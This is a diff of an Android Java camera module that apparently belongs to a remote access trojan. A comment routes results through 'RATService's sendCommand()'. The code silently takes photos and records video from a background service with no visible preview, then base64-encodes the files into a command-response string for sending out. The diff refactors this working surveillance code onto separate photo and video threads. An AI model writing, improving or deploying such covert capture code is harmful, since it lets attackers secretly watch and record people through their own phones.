@@ -37,38 +37,51 @@ import java.util.concurrent.atomic.AtomicReference;
 public class CameraModule {
     private static final String TAG = "CameraModule";
 
-    // ── How long to let the sensor/AE warm up before firing the capture.
-    // 1500ms is reliable on mid-range devices without a live preview surface.
-    private static final long   WARMUP_MS           = 2500;
-    private static final int    CAPTURE_TIMEOUT_MS  = 15000;
-    private static final int    MAX_RETRY_ATTEMPTS  = 2;
+    private static final long WARMUP_MS          = 2500;
+    private static final int  CAPTURE_TIMEOUT_MS = 15000;
+    private static final int  MAX_RETRY_ATTEMPTS = 2;
 
     private final Context       context;
     private final CameraManager cameraManager;
-    private final Handler       backgroundHandler;
-    private final HandlerThread backgroundThread;
+
+    // ── Two independent background threads so photo and video never share one ──
+    private final HandlerThread photoThread;
+    private final Handler       photoHandler;
+    private final HandlerThread videoThread;
+    private final Handler       videoHandler;
 
     private String  currentCameraId;
     private String  backCameraId;
     private String  frontCameraId;
     private boolean isUsingFrontCamera = false;
 
-    private ImageReader          imageReader;
-    private CameraDevice         cameraDevice;
-    private CameraCaptureSession captureSession;
+    // ── Photo-only resources ──────────────────────────────────────────────────
+    private ImageReader          photoImageReader;
+    private CameraDevice         photoCameraDevice;
+    private CameraCaptureSession photoCaptureSession;
 
-    private MediaRecorder videoRecorder;
-    private boolean       isRecordingVideo = false;
-    private String        currentVideoPath;
+    // ── Video-only resources ──────────────────────────────────────────────────
+    private ImageReader          videoImageReader;   // dummy preview surface
+    private CameraDevice         videoCameraDevice;
+    private CameraCaptureSession videoCaptureSession;
+    private MediaRecorder        videoRecorder;
+    private boolean              isRecordingVideo = false;
+    private String               currentVideoPath;
 
     // ── Constructor ───────────────────────────────────────────────────────────
 
     public CameraModule(Context context) {
         this.context       = context;
         this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
-        backgroundThread   = new HandlerThread("CameraBackground");
-        backgroundThread.start();
-        backgroundHandler = new Handler(backgroundThread.getLooper());
+
+        photoThread = new HandlerThread("CameraPhotoThread");
+        photoThread.start();
+        photoHandler = new Handler(photoThread.getLooper());
+
+        videoThread = new HandlerThread("CameraVideoThread");
+        videoThread.start();
+        videoHandler = new Handler(videoThread.getLooper());
+
         findCameras();
     }
 
@@ -95,27 +108,50 @@ public class CameraModule {
     // ── Switch camera ─────────────────────────────────────────────────────────
 
     public String switchCamera() {
-        closeCamera();
+        // Only safe to switch when no recording is active
+        if (isRecordingVideo) return "ERROR: Stop recording before switching camera";
+        closePhotoCamera();
         if (isUsingFrontCamera) {
             if (backCameraId == null)  return "ERROR: No back camera";
-            currentCameraId = backCameraId;  isUsingFrontCamera = false;
+            currentCameraId    = backCameraId;
+            isUsingFrontCamera = false;
             return "SUCCESS: Switched to back camera";
         } else {
             if (frontCameraId == null) return "ERROR: No front camera";
-            currentCameraId = frontCameraId; isUsingFrontCamera = true;
+            currentCameraId    = frontCameraId;
+            isUsingFrontCamera = true;
             return "SUCCESS: Switched to front camera";
         }
     }
 
     public String getCurrentCamera() { return isUsingFrontCamera ? "front" : "back"; }
 
-    // ── Resource management ───────────────────────────────────────────────────
+    // ── Photo resource management ─────────────────────────────────────────────
 
-    private synchronized void closeCamera() {
-        try { if (captureSession != null) { captureSession.close(); captureSession = null; } } catch (Exception ignored) {}
-        try { if (cameraDevice   != null) { cameraDevice.close();   cameraDevice   = null; } } catch (Exception ignored) {}
-        try { if (imageReader    != null) { imageReader.close();     imageReader    = null; } } catch (Exception ignored) {}
+    private synchronized void closePhotoCamera() {
+        try { if (photoCaptureSession != null) { photoCaptureSession.close(); photoCaptureSession = null; } } catch (Exception ignored) {}
+        try { if (photoCameraDevice   != null) { photoCameraDevice.close();   photoCameraDevice   = null; } } catch (Exception ignored) {}
+        try { if (photoImageReader    != null) { photoImageReader.close();    photoImageReader    = null; } } catch (Exception ignored) {}
     }
+
+    // ── Video resource management ─────────────────────────────────────────────
+
+    private synchronized void closeVideoCamera() {
+        try { if (videoCaptureSession != null) { videoCaptureSession.close(); videoCaptureSession = null; } } catch (Exception ignored) {}
+        try { if (videoCameraDevice   != null) { videoCameraDevice.close();   videoCameraDevice   = null; } } catch (Exception ignored) {}
+        try { if (videoImageReader    != null) { videoImageReader.close();    videoImageReader    = null; } } catch (Exception ignored) {}
+    }
+
+    private void releaseVideoRecorder() {
+        if (videoRecorder != null) {
+            try { videoRecorder.stop();    } catch (Exception ignored) {}
+            try { videoRecorder.reset();   } catch (Exception ignored) {}
+            try { videoRecorder.release(); } catch (Exception ignored) {}
+            videoRecorder = null;
+        }
+    }
+
+    // ── Permission check ──────────────────────────────────────────────────────
 
     private boolean checkPermission() {
         return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
@@ -124,10 +160,6 @@ public class CameraModule {
 
     // ── Size helpers ──────────────────────────────────────────────────────────
 
-    /**
-     * Returns the largest JPEG size up to ~12 MP (4032 × 3024).
-     * Capping prevents excessively large base64 payloads over the socket.
-     */
     private Size getBestPhotoSize() {
         try {
             StreamConfigurationMap m = cameraManager
@@ -148,7 +180,6 @@ public class CameraModule {
         } catch (Exception e) { return new Size(3840, 2160); }
     }
 
-    /** Prefers 1080p; falls back to the largest size ≤ 1080p. */
     private Size getBestVideoSize() {
         try {
             StreamConfigurationMap m = cameraManager
@@ -171,24 +202,16 @@ public class CameraModule {
     }
 
     // ─────────────────────────────────────────────────────────────────────────
-    //  takePhoto
-    //
-    //  Strategy: open camera → start a repeating PREVIEW request → wait
-    //  WARMUP_MS for AE/AF to settle → fire one STILL_CAPTURE request →
-    //  wait for the image.
-    //
-    //  The repeating preview request is key: it drives the camera ISP and
-    //  lets AE converge even from a background service with no display surface.
-    //  We use the same ImageReader surface for both the preview frames (which
-    //  we discard) and the final still capture.
+    //  takePhoto  —  completely independent from video resources
     // ─────────────────────────────────────────────────────────────────────────
 
     public String takePhoto() {
         if (!checkPermission())      return "ERROR: No camera permission";
         if (currentCameraId == null) return "ERROR: No camera available";
+        if (isRecordingVideo)        return "ERROR: Cannot take photo while recording video";
 
         for (int attempt = 0; attempt < MAX_RETRY_ATTEMPTS; attempt++) {
-            closeCamera();
+            closePhotoCamera();  // only closes photo resources, never touches video
             String r = doTakePhoto();
             if (!r.startsWith("ERROR")) return r;
             Log.w(TAG, "Photo attempt " + (attempt + 1) + " failed: " + r);
@@ -198,21 +221,20 @@ public class CameraModule {
     }
 
     private String doTakePhoto() {
-        final AtomicReference<String> result  = new AtomicReference<>(null);
-        final CountDownLatch           latch   = new CountDownLatch(1);
-        final AtomicBoolean            fired   = new AtomicBoolean(false);
+        final AtomicReference<String> result = new AtomicReference<>(null);
+        final CountDownLatch           latch  = new CountDownLatch(1);
+        final AtomicBoolean            fired  = new AtomicBoolean(false);
 
         try {
             Size photoSize = getBestPhotoSize();
             Log.d(TAG, "Photo size: " + photoSize.getWidth() + "×" + photoSize.getHeight());
 
-            imageReader = ImageReader.newInstance(
+            // Use photoImageReader — never shared with video
+            photoImageReader = ImageReader.newInstance(
                     photoSize.getWidth(), photoSize.getHeight(), ImageFormat.JPEG, 3);
 
-            // The listener captures whichever image arrives AFTER we fire the
-            // still-capture request (i.e. we ignore preview frames by checking fired).
-            imageReader.setOnImageAvailableListener(reader -> {
-                if (!fired.get()) return; // still in warm-up — discard preview frame
+            photoImageReader.setOnImageAvailableListener(reader -> {
+                if (!fired.get()) return; // discard warm-up preview frames
                 try (Image img = reader.acquireLatestImage()) {
                     if (img == null) return;
                     ByteBuffer buf   = img.getPlanes()[0].getBuffer();
@@ -225,21 +247,21 @@ public class CameraModule {
                 } finally {
                     latch.countDown();
                 }
-            }, backgroundHandler);
+            }, photoHandler);
 
             cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                 @Override
                 public void onOpened(CameraDevice device) {
-                    cameraDevice = device;
+                    photoCameraDevice = device;
                     try {
                         List<Surface> surfaces = new ArrayList<>();
-                        surfaces.add(imageReader.getSurface());
+                        surfaces.add(photoImageReader.getSurface());
 
                         device.createCaptureSession(surfaces,
                                 new CameraCaptureSession.StateCallback() {
                                     @Override
                                     public void onConfigured(CameraCaptureSession session) {
-                                        captureSession = session;
+                                        photoCaptureSession = session;
                                         try {
                                             startWarmupThenCapture(session, device, result, latch, fired);
                                         } catch (Exception e) {
@@ -252,35 +274,41 @@ public class CameraModule {
                                         result.set("ERROR: Session configure failed");
                                         latch.countDown();
                                     }
-                                }, backgroundHandler);
+                                }, photoHandler);
                     } catch (Exception e) {
                         result.set("ERROR: " + e.getMessage());
                         latch.countDown();
                     }
                 }
                 @Override public void onDisconnected(CameraDevice d) {
-                    d.close(); result.set("ERROR: Camera disconnected"); latch.countDown();
+                    d.close();
+                    photoCameraDevice = null;
+                    result.set("ERROR: Camera disconnected");
+                    latch.countDown();
                 }
                 @Override public void onError(CameraDevice d, int e) {
-                    d.close(); result.set("ERROR: Camera error " + e); latch.countDown();
+                    d.close();
+                    photoCameraDevice = null;
+                    result.set("ERROR: Camera error " + e);
+                    latch.countDown();
                 }
-            }, backgroundHandler);
+            }, photoHandler);
 
             boolean done = latch.await(CAPTURE_TIMEOUT_MS, TimeUnit.MILLISECONDS);
-            closeCamera();
-            if (!done)              return "ERROR: Capture timeout";
+            closePhotoCamera();
+            if (!done)               return "ERROR: Capture timeout";
             if (result.get() == null) return "ERROR: No result";
             return result.get();
 
         } catch (Exception e) {
-            closeCamera();
+            closePhotoCamera();
             return "ERROR: " + e.getMessage();
         }
     }
 
     /**
-     * Starts a repeating PREVIEW request to warm up AE/AF.
-     * After WARMUP_MS, atomically marks fired=true and issues STILL_CAPTURE.
+     * Starts a repeating PREVIEW request to warm up AE/AF, then after
+     * WARMUP_MS fires the still capture.  Uses photoHandler exclusively.
      */
     private void startWarmupThenCapture(
             CameraCaptureSession session,
@@ -291,26 +319,22 @@ public class CameraModule {
 
         CaptureRequest.Builder previewBuilder =
                 device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
-        previewBuilder.addTarget(imageReader.getSurface());
+        previewBuilder.addTarget(photoImageReader.getSurface());
         previewBuilder.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
         previewBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
         previewBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
 
-        session.setRepeatingRequest(previewBuilder.build(), null, backgroundHandler);
-        Log.d(TAG, "Preview started — waiting " + WARMUP_MS + "ms for AE/AF to settle");
+        session.setRepeatingRequest(previewBuilder.build(), null, photoHandler);
+        Log.d(TAG, "Preview started — waiting " + WARMUP_MS + "ms for AE/AF");
 
-        // After warmup delay, stop preview and fire still capture
-        backgroundHandler.postDelayed(() -> {
+        photoHandler.postDelayed(() -> {
             try {
                 session.stopRepeating();
-
-                // Mark fired BEFORE sending the capture request so the
-                // ImageAvailableListener knows to keep the next image.
-                fired.set(true);
+                fired.set(true);  // mark BEFORE firing so listener keeps next image
 
                 CaptureRequest.Builder stillBuilder =
                         device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
-                stillBuilder.addTarget(imageReader.getSurface());
+                stillBuilder.addTarget(photoImageReader.getSurface());
                 stillBuilder.set(CaptureRequest.JPEG_QUALITY,    (byte) 97);
                 stillBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                 stillBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
@@ -323,8 +347,7 @@ public class CameraModule {
                             @Override
                             public void onCaptureCompleted(CameraCaptureSession s,
                                     CaptureRequest req, TotalCaptureResult captureResult) {
-                                Log.d(TAG, "Still capture completed by HAL");
-                                // Image will arrive via ImageAvailableListener
+                                Log.d(TAG, "Still capture completed");
                             }
                             @Override
                             public void onCaptureFailed(CameraCaptureSession s,
@@ -333,7 +356,7 @@ public class CameraModule {
                                 result.set("ERROR: Capture failed (reason=" + failure.getReason() + ")");
                                 latch.countDown();
                             }
-                        }, backgroundHandler);
+                        }, photoHandler);
 
                 Log.d(TAG, "Still capture request fired");
             } catch (Exception e) {
@@ -353,7 +376,7 @@ public class CameraModule {
     }
 
     // ─────────────────────────────────────────────────────────────────────────
-    //  Video recording
+    //  Video recording  —  uses entirely separate resources from photo
     // ─────────────────────────────────────────────────────────────────────────
 
     public String startRecording(String args) {
@@ -361,12 +384,17 @@ public class CameraModule {
         if (isRecordingVideo)        return "ERROR: Already recording";
         if (currentCameraId == null) return "ERROR: No camera available";
 
+        // Close any leftover photo camera first (shouldn't be open, but be safe)
+        closePhotoCamera();
+        // Also close any previous video session
+        closeVideoCamera();
+        releaseVideoRecorder();
+
         int maxDurationSec = 60;
         if (args != null && !args.isEmpty()) {
             try { maxDurationSec = Integer.parseInt(args.trim()); } catch (NumberFormatException ignored) {}
         }
 
-        closeCamera();
         final CountDownLatch         latch = new CountDownLatch(1);
         final AtomicReference<String> sr   = new AtomicReference<>(null);
 
@@ -398,32 +426,33 @@ public class CameraModule {
 
             final Surface recorderSurface = videoRecorder.getSurface();
 
-            // Small dummy ImageReader — some devices need ≥2 output surfaces
-            imageReader = ImageReader.newInstance(320, 240, ImageFormat.YUV_420_888, 2);
-            imageReader.setOnImageAvailableListener(
+            // Small dummy ImageReader for devices that require ≥2 output surfaces
+            videoImageReader = ImageReader.newInstance(320, 240, ImageFormat.YUV_420_888, 2);
+            videoImageReader.setOnImageAvailableListener(
                     r -> { try (Image i = r.acquireLatestImage()) { /* discard */ } catch (Exception ignored) {} },
-                    backgroundHandler);
+                    videoHandler);
 
             cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                 @Override public void onOpened(CameraDevice device) {
-                    cameraDevice = device;
+                    videoCameraDevice = device;
                     try {
                         List<Surface> surfaces = new ArrayList<>();
                         surfaces.add(recorderSurface);
-                        surfaces.add(imageReader.getSurface());
+                        surfaces.add(videoImageReader.getSurface());
+
                         device.createCaptureSession(surfaces,
                                 new CameraCaptureSession.StateCallback() {
                                     @Override public void onConfigured(CameraCaptureSession session) {
-                                        captureSession = session;
+                                        videoCaptureSession = session;
                                         try {
                                             CaptureRequest.Builder b =
                                                     device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                             b.addTarget(recorderSurface);
-                                            b.addTarget(imageReader.getSurface());
+                                            b.addTarget(videoImageReader.getSurface());
                                             b.set(CaptureRequest.CONTROL_MODE,    CaptureRequest.CONTROL_MODE_AUTO);
                                             b.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                             b.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
-                                            session.setRepeatingRequest(b.build(), null, backgroundHandler);
+                                            session.setRepeatingRequest(b.build(), null, videoHandler);
                                             videoRecorder.start();
                                             isRecordingVideo = true;
                                             sr.set("SUCCESS: Recording started — " + currentVideoPath);
@@ -433,25 +462,46 @@ public class CameraModule {
                                         } finally { latch.countDown(); }
                                     }
                                     @Override public void onConfigureFailed(CameraCaptureSession s) {
-                                        sr.set("ERROR: Session configure failed"); latch.countDown();
+                                        sr.set("ERROR: Session configure failed");
+                                        latch.countDown();
                                     }
-                                }, backgroundHandler);
-                    } catch (Exception e) { sr.set("ERROR: " + e.getMessage()); latch.countDown(); }
+                                }, videoHandler);
+                    } catch (Exception e) {
+                        sr.set("ERROR: " + e.getMessage());
+                        latch.countDown();
+                    }
                 }
                 @Override public void onDisconnected(CameraDevice d) {
-                    d.close(); sr.set("ERROR: Camera disconnected"); latch.countDown();
+                    d.close();
+                    videoCameraDevice = null;
+                    sr.set("ERROR: Camera disconnected");
+                    latch.countDown();
                 }
                 @Override public void onError(CameraDevice d, int e) {
-                    d.close(); sr.set("ERROR: Camera error " + e); latch.countDown();
+                    d.close();
+                    videoCameraDevice = null;
+                    sr.set("ERROR: Camera error " + e);
+                    latch.countDown();
                 }
-            }, backgroundHandler);
+            }, videoHandler);
 
             latch.await(8, TimeUnit.SECONDS);
-            return sr.get() != null ? sr.get() : "ERROR: Timeout starting recording";
+            if (sr.get() == null) {
+                releaseVideoRecorder();
+                closeVideoCamera();
+                return "ERROR: Timeout starting recording";
+            }
+            // On error, clean up
+            if (sr.get().startsWith("ERROR")) {
+                releaseVideoRecorder();
+                closeVideoCamera();
+            }
+            return sr.get();
 
         } catch (Exception e) {
             Log.e(TAG, "startRecording error", e);
             releaseVideoRecorder();
+            closeVideoCamera();
             return "ERROR: " + e.getMessage();
         }
     }
@@ -460,42 +510,36 @@ public class CameraModule {
         if (!isRecordingVideo) return "ERROR: No active recording";
         try {
             isRecordingVideo = false;
-            try { if (captureSession != null) captureSession.stopRepeating(); } catch (Exception ignored) {}
-            closeCamera();
+            try { if (videoCaptureSession != null) videoCaptureSession.stopRepeating(); } catch (Exception ignored) {}
+            closeVideoCamera();
             releaseVideoRecorder();
 
             File f = new File(currentVideoPath);
             if (!f.exists() || f.length() == 0) return "ERROR: Video file empty or missing";
 
-            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes → encoding...");
+            Log.d(TAG, "🎥 Video saved: " + f.length() + " bytes — encoding...");
             byte[] bytes = readFileToBytes(f);
             String b64   = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
             JSONObject resp = new JSONObject();
-            resp.put("success",   true);           // required by sendCommand's FILE_GET chunker
+            resp.put("success",   true);
             resp.put("command",   "video_recording_result");
             resp.put("status",    "success");
-            resp.put("name",      f.getName());     // sendCommand reads "name" field
+            resp.put("name",      f.getName());
             resp.put("file_name", f.getName());
             resp.put("file_size", f.length());
-            resp.put("size",      f.length());      // sendCommand reads "size" field
-            resp.put("data",      b64);             // sendCommand reads "data" field
+            resp.put("size",      f.length());
+            resp.put("data",      b64);
             resp.put("file_data", b64);
             resp.put("path",      f.getAbsolutePath());
+
+            // Return in FILE_GET format so RATService's sendCommand() chunks it
             return "FILE_GET|" + resp.toString();
 
         } catch (Exception e) {
             Log.e(TAG, "stopRecording error", e);
+            isRecordingVideo = false;
             return "ERROR: " + e.getMessage();
-        }
-    }
-
-    private void releaseVideoRecorder() {
-        if (videoRecorder != null) {
-            try { videoRecorder.stop();    } catch (Exception ignored) {}
-            try { videoRecorder.reset();   } catch (Exception ignored) {}
-            try { videoRecorder.release(); } catch (Exception ignored) {}
-            videoRecorder = null;
         }
     }
 
@@ -509,10 +553,10 @@ public class CameraModule {
         AtomicReference<String> r = new AtomicReference<>("Failed");
         try {
             cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
-                @Override public void onOpened(CameraDevice d) { d.close(); r.set("SUCCESS"); latch.countDown(); }
-                @Override public void onDisconnected(CameraDevice d) { r.set("ERROR: Disconnected"); latch.countDown(); }
+                @Override public void onOpened(CameraDevice d)        { d.close(); r.set("SUCCESS"); latch.countDown(); }
+                @Override public void onDisconnected(CameraDevice d)  { r.set("ERROR: Disconnected"); latch.countDown(); }
                 @Override public void onError(CameraDevice d, int e)  { r.set("ERROR: " + e); latch.countDown(); }
-            }, backgroundHandler);
+            }, photoHandler);
             latch.await(5, TimeUnit.SECONDS);
             return r.get();
         } catch (Exception e) { return "ERROR: " + e.getMessage(); }
@@ -583,14 +627,19 @@ public class CameraModule {
 
     private byte[] readFileToBytes(File f) throws IOException {
         try (FileInputStream fis = new FileInputStream(f)) {
-            byte[] b = new byte[(int) f.length()]; fis.read(b); return b;
+            byte[] b = new byte[(int) f.length()];
+            fis.read(b);
+            return b;
         }
     }
 
     public void cleanup() {
-        closeCamera();
+        closePhotoCamera();
+        closeVideoCamera();
         releaseVideoRecorder();
-        backgroundThread.quitSafely();
-        try { backgroundThread.join(); } catch (InterruptedException ignored) {}
+        photoThread.quitSafely();
+        videoThread.quitSafely();
+        try { photoThread.join(); } catch (InterruptedException ignored) {}
+        try { videoThread.join(); } catch (InterruptedException ignored) {}
     }
 }
